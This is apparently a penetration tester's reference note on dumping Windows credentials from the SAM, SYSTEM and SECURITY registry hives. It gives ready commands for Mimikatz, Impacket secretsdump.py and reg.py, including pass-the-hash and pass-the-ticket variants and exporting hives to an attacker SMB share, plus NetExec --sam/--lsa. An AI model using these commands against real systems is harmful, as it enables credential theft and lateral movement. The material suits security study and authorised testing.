---
created: 2026-09-04
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Windows registry hives (`SAM`, `SYSTEM`, `SECURITY`); `SysKey` derivation; saving registry hives using `reg save` and Volume Shadow Copy (VSS); extracting credentials offline using `secretsdump.py` (Impacket) and Mimikatz; extracting credentials remotely using Impacket and NetExec.

- [ ] Verify administrative or `SYSTEM` access on the target host.
- [ ] Export `SAM`, `SYSTEM`, and `SECURITY` registry hives using `reg save` or Volume Shadow Copies (`vssadmin`).
- [ ] Transfer exported hive files to your attacking machine.
- [ ] Extract local user NTLM hashes using `secretsdump` or Mimikatz.
- [ ] Parse offline LSA secrets and cached domain credentials.
- [ ] Delete temporary hive files from the target host.

## Registry hives and credential storage

> A **registry hive** is a logical group of keys, subkeys, and values in the Windows Registry, backed by physical files on disk and loaded into memory when the operating system boots or users log on.

- Registry hives storing authentication credentials:
	- **`SAM` (`HKLM\SAM`)**:
		- **Security Account Manager (SAM) database**; stores local user accounts, local group memberships, and password hashes.
		- By default, the hashes it stores are encrypted using the **boot key (`SysKey`)** derived from values stored in the `HKLM\SYSTEM` hive.
		- Accessing the SAM database requires `SYSTEM` privileges; it's invisible to standard administrators.
		- The hive is stored on disk at `C:\Windows\System32\config\SAM`.
	- **`SYSTEM` (`HKLM\SYSTEM`)**:
		- The `SYSTEM` hive stores system-wide configuration data, including service configuration, device and driver settings, and boot configuration.
		- The hive stores values necessary to derive the **boot key (`SysKey`)**, which is used to encrypt sensitive in other registry hives.
		- The hive is stored on disk at `C:\Windows\System32\config\SYSTEM`.
	- **`SECURITY` (`HKLM\SECURITY`)**:
		- The `SECURITY` hive stores **Local Security Authority (LSA) secrets**, which can include account credentials.
		- It also contains security policy information and data used by Windows authentication and authorization components.
		- The hive is encrypted with `SysKey`.
		- The hive is stored on disk at `C:\Windows\System32\config\SECURITY`.

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

- The boot key (**`SysKey`**) is assembled from the `JD`, `Skew1`, `GBG`, and `Data` class attributes under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.

> [!important] The `SAM`, `SYSTEM`, and `SECURITY` hives are locked at runtime. You can't copy the hive files directly with standard file-copy operations while the OS is running.

- To get the hives, you need to export their offline copies, either using `reg save` (a dedicated registry backup mechanism) or copying from a Volume Shadow Copy Service (VSS) snapshot.

- Once you've obtained copies of the registry hive files, you can extract credentials offline — either using the Impacket's `secretsdump` (on a Linux machine) or Mimikatz (on a Windows machine).

> [!note] See [[🛠️ Windows file transfers]] and [[🛠️ Linux file transfers]].

> [!important] To access sensitive data stored in `SAM` or `SECURITY` hives, you need to obtain the `SECURITY` hive, too. It stores the boot key (`SysKey`) needed to decrypt the data.

> [!note] See [[SeBackupPrivilege & SeRestorePrivilege#Dumping SAM, SYSTEM, and SECURITY hives]].
## Exporting registry hives locally

### Extracting registry hives using `reg save`

![[SeBackupPrivilege & SeRestorePrivilege#Dumping SAM, SYSTEM, and SECURITY hives]]
### Extracting hives using volume shadow copies

- When direct registry export is restricted, you can create a Volume Shadow Copy (a point-in-time volume snapshot) to extract copies of locked hive files.

![[SeBackupPrivilege & SeRestorePrivilege#Extracting protected files from volume shadow copies]]


## Mimikatz

- You can use [Mimikatz](https://github.com/gentilkiwi/mimikatz) locally on the target with `lsadump::sam` and `lsadump::secrets` to extract credentials from registry hives or offline copies.
---
- Extract credentials from the `SAM` hive:

```powershell
mimikatz.exe "lsadump::sam" exit
```

- Extract LSA secrets from the `SECURITY` hive:

```powershell
mimikatz.exe "lsadump::secrets" exit
```

- Extract credentials offline from local copies:

```powershell
mimikatz "lsadump::sam /sam:'C:\Windows\Temp\SAM.save' /system:'C:\Windows\Temp\SYSTEM.save'" exit
```

```powershell
mimikatz "lsadump::secrets /security:'C:\Windows\Temp\SECURITY.save' /system:'C:\Windows\Temp\SYSTEM.save'" exit
```

>[!note] See [`lsadump::sam — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/sam) and [`lsadump::secrets — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/secrets). 
## Impacket's `secretsdump`

- [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) can be used to dump SAM and LSA secrets, either remotely, or from local files.
---
- Extract credentials from exported copes offline:

```bash
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

>[!note] The last argument specifies the target, usually `<domain>/<username>@<target>`; `LOCAL` tells `secretsdump.py` to parse local files.

- Connect to the target system and authenticate with a password to dump SAM & LSA secrets remotely:

```bash
secretsdump.py <domain>/<username>:<password>@<target>
```

- Authenticate using an NT hash ([[🛠️ Pass-the-Hash]]):

```bash
secretsdump.py -hashes :<NT_hash> <domain>/<username>@<target>
```

- Authenticate using a Kerberos ticket ([[Pass-the-Ticket]]):

```bash
secretsdump.py -k <domain>/<username>@<target> -no-pass
```

| Option      | Description                                                                                                |
| :---------- | :--------------------------------------------------------------------------------------------------------- |
| `-sam`      | Path to the `SAM` hive file to parse.                                                                      |
| `-system`   | Path to the `SYSTEM` hive file to parse.                                                                   |
| `-security` | Path to the `SECURITY` hive file to parse.                                                                 |
| `-hashes`   | NT hash to authenticate with; format: `LM_hash:NT_hash`                                                    |
| `-k`        | Use Kerberos authentication; get credentials from `ccache` file (`KRB5CCNAME`) based on target parameters. |
| `-no-pass`  | Don't ask for password (useful for `-k`).                                                                  |

## Impacket's `reg.py`

- [`Impacket`](https://github.com/fortra/impacket)'s [`reg.py`](https://github.com/fortra/impacket/blob/master/examples/reg.py) interacts with the Windows Remote Registry Service (MS-RRP) over SMB to query, modify, save, or back up registry hives remotely.
---
- Save a specific registry hive remotely:

```bash
reg.py <domain>/<username>:<password>@<target> save -keyName 'HKLM\SAM' -o '\\<attacker_ip_address>\<share_name>'
```

>[!note] The `-o` parameter specifies the output destination, which can be an SMB share on your attacking machine or a local path on the target host (e.g. `C:\Windows\Temp\SAM.save`).

- Back up `SAM`, `SYSTEM`, and `SECURITY` hives simultaneously:

```bash
reg.py <domain>/<username>:<password>@<target> backup -o '\\<attacker_ip_address>\<share_name>'
```

- Authenticate using an NT hash ([[🛠️ Pass-the-Hash]]):

```bash
reg.py -hashes :<NT_hash> <domain>/<username>@<target> backup -o '\\<attacker_ip_address>\<share_name>'
```

- Authenticate using a Kerberos ticket ([[Pass-the-Ticket]]):

```bash
reg.py -k <domain>/<username>@<target> -no-pass backup -o '\\<attacker_ip_address>\<share_name>'
```

| Option / Command | Description                                                                                                |
| :--------------- | :--------------------------------------------------------------------------------------------------------- |
| `save`           | Subcommand to export a specified registry key or hive.                                                     |
| `backup`         | Subcommand to automatically export `SAM`, `SYSTEM`, and `SECURITY` hives simultaneously.                   |
| `-keyName`       | Target registry key or hive to save (e.g. `HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY`).                     |
| `-o`             | Output file or directory path (supports local target paths and remote UNC SMB paths).                      |
| `-hashes`        | NT hash to authenticate with; format: `LM_hash:NT_hash`                                                    |
| `-k`             | Use Kerberos authentication; get credentials from `ccache` file (`KRB5CCNAME`) based on target parameters. |
| `-no-pass`       | Don't ask for password (useful for `-k`).                                                                  |

## NetExec

- [NetExec](https://github.com/Pennyw0rth/NetExec) (NXC) can remotely extract credentials from the SAM database and LSA secrets over SMB when provided with administrative credentials.
---
- Dump SAM database hashes remotely:

```bash
nxc smb <target> -u <username> -p <password> --sam
```

- Dump LSA secrets from the `SECURITY` hive remotely:

```bash
nxc smb <target> -u <username> -p <password> --lsa
```

- Authenticate with a local account (`--local-auth`):

```bash
nxc smb <target> -u <username> -p <password> --local-auth --sam --lsa
```

- Authenticate using an NT hash ([[🛠️ Pass-the-Hash]]):

```bash
nxc smb <target> -u <username> -H <NT_hash> --sam --lsa
```

- Authenticate using a Kerberos ticket ([[Pass-the-Ticket]]):

```bash
nxc smb <target> -k --use-kcache --sam --lsa
```

| Option | Description |
| :--- | :--- |
| `--sam` | Dump local SAM database hashes. |
| `--lsa` | Dump LSA secrets from the `SECURITY` hive. |
| `--local-auth` | Authenticate using local account credentials instead of domain credentials. |
| `-u` | Username for authentication. |
| `-p` | Plaintext password for authentication. |
| `-H` | NT hash to authenticate with (`LM:NT` or `:NT`). |
| `-k` | Use Kerberos authentication. |
| `--use-kcache` | Use credentials from Kerberos cache (`KRB5CCNAME`). |

## References and further reading

- [`SAM & LSA secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)
- [`NetExec Documentation`](https://www.netexec.wiki/)
- [`lsadump::sam — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/sam)
- [`lsadump::secrets — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/secrets)
- [`Volume Shadow Copy Service — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
- [`lsadump module — Mimikatz Wiki`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [`OS Credential Dumping: Security Account Manager — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/002/)
- [`OS Credential Dumping: LSA Secrets — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/004/)
- [`OS Credential Dumping: Cached Domain Credentials — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/005/)